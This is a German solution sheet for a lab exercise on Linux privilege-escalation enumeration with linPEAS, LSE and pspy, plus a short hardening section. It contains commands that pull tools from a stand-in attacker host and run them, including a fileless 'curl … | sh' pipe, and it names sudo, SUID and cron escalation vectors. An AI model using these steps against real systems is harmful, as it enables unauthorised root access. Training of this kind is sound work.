# Lösung – Übung 02: Automatisierte Enumeration

`<KALI>` = Kali-IP.

## 1. linPEAS übertragen & ausführen

Auf Kali (linpeas liegt unter `/usr/share/peass/linpeas/` oder von GitHub):
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 8000
```
Auf dem Ziel:
```bash
cd /tmp
wget http://<KALI>:8000/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_out.txt
# ohne Datei auf Platte (fileless):
curl http://<KALI>:8000/linpeas.sh | sh
```

## 2. Treffer interpretieren

linPEAS färbt:
- **Rot/Gelb-Hintergrund** = „95% PE vector" (heiß): z. B. schreibbare `/etc/passwd`, gefährliche sudo-/SUID-Einträge, Kernel-Exploit-Kandidaten.
- **Rot** = interessant, **Gelb** = beachten.
Abgleich mit Übung 01: linPEAS findet i. d. R. dieselben + zusätzliche (Credentials in Configs, Capabilities, …).

## 3. LSE

```bash
wget http://<KALI>:8000/lse.sh -O lse.sh; chmod +x lse.sh
./lse.sh -l 1          # Level 1 = interessante Funde, -l 2 = alles
```
LSE ist kompakter/übersichtlicher; gut als Zweitmeinung.

## 4. pspy – versteckter Cron

```bash
wget http://<KALI>:8000/pspy64 -O pspy64; chmod +x pspy64
./pspy64
```
Zeigt live jeden gestarteten Prozess + UID. Ein `UID=0`-Prozess, der periodisch ein Skript startet (z. B. `/opt/backup.sh`), ist ein **root-Cron-Job**, den `cat /etc/crontab` evtl. nicht zeigte (user-crontab/andere Pfade). → Vektor für Übung 05.

## 5. Top-3 (Beispiel)

```
1. sudo NOPASSWD /usr/bin/vim      -> GTFOBins, sofortiger root (Übung 03)
2. SUID /usr/bin/python            -> GTFOBins (Übung 04)
3. root-Cron /opt/backup.sh writable -> Übung 05
```
Priorisierung nach Zuverlässigkeit + Aufwand (sudo/SUID = sofort, Cron = warten).

## Härtung

- Admins nutzen dieselben Tools (linPEAS/LSE) zum **Self-Audit** → Vektoren vor dem Angreifer schließen.
- Least privilege, keine schreibbaren root-Skripte, Credentials nicht in Configs.

## Häufige Fehler / Troubleshooting

- **`/tmp` noexec:** nach `/dev/shm` ausweichen oder fileless per `curl | sh`.
- **Kein wget/curl:** Alternativen (`python3 -m http.server` + `python`-Download, `nc`, `scp`).
- **Zu viel Output:** `tee` in Datei, dann `grep`/weniger; LSE `-l 1`.
- **Blind vertraut:** linPEAS-Treffer verifizieren (nächste Übungen), nicht blind Exploits feuern.
